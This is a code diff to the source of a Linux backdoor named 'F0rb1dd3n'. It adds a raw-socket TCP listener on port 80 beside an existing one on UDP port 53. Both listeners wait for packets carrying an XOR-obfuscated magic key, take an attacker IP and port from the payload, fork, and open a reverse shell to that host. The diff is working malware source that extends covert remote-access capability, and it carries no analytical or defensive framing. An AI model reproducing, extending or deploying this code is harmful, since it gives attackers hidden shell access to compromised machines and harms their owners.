@@ -21,13 +21,16 @@
 #include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
 #include <netinet/udp.h>
+#include <netinet/tcp.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <signal.h>
 
 #define KEY		"F0rb1dd3n"
-#define PACKET_SIZE 	1024
 #define MOTD 		"\n\t\e[00;31mWellcome to F0rb1dd3n's sensual reverse shell!\n\n"
+#define PACKET_SIZE 	1024
+#define UDPPORT		53
+#define TCPPORT		80
 
 void reverse_shell(char *host, int port){
         int sockfd;
@@ -125,12 +128,57 @@ void udp_listener(void) {
 			ip = (struct ip *)buf;
 			udp = (struct udphdr *)(ip + 1);
 			
-			if((udp->dest == htons(53)) && (strstr(buf, key) == 0)){
+			if((udp->dest == htons(UDPPORT)) && (strstr(buf, key) == 0)){
                 		char *attacker_ip, *data = (char *) malloc(ksize+24);
                 		int attacker_port = 0;
 
 				bzero(data, ksize+24);
 				memcpy(data, buf + sizeof(struct iphdr) + sizeof(struct udphdr), ksize+24);
+
+				s_xor(data, 11, strlen(data));
+			
+				strtok(data, " ");
+				attacker_ip = strtok(NULL, " ");
+				attacker_port = atoi(strtok(NULL, " "));
+                		
+				if((attacker_port <= 0) || (strlen(attacker_ip) < 7)){
+					continue;
+				} else {
+                			if(fork() == 0){
+						reverse_shell(attacker_ip, attacker_port);
+                    				exit(EXIT_SUCCESS);
+                			}
+				}		
+				free(data);		
+			}
+		}
+	}
+}
+
+void tcp_listener(void) {
+	int sockfd, n, ksize;
+	char buf[PACKET_SIZE + 1], key[] = KEY;
+	struct ip *ip;
+	struct tcphdr* tcp;
+	
+	ksize = strlen(KEY);
+	s_xor(key, 11, ksize);
+
+	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) exit(-1);
+
+	while(1){
+		bzero(buf, PACKET_SIZE + 1);
+		n = recv(sockfd, buf, PACKET_SIZE, 0);
+		if(n > 0){
+			ip = (struct ip *)buf;
+			tcp = (struct tcphdr *)(ip + 1);
+			
+			if((tcp->dest == htons(TCPPORT)) && (strstr(buf, key) == 0)){
+                		char *attacker_ip, *data = (char *) malloc(ksize+24);
+                		int attacker_port = 0;
+
+				bzero(data, ksize+24);
+				memcpy(data, buf + sizeof(struct iphdr) + sizeof(struct tcphdr), ksize+24);
 
 				s_xor(data, 11, strlen(data));
 			
@@ -170,6 +218,14 @@ int main(int argc, char *argv[]){
 		if(pid == -1) exit(-1);
 
 		if(pid == 0) udp_listener();
+	
+		if(pid > 0) {
+			pid = fork();
+		
+			if(pid == -1) exit(-1);
+
+			if(pid == 0) tcp_listener();
+		}
 	}
 
 	return EXIT_SUCCESS;
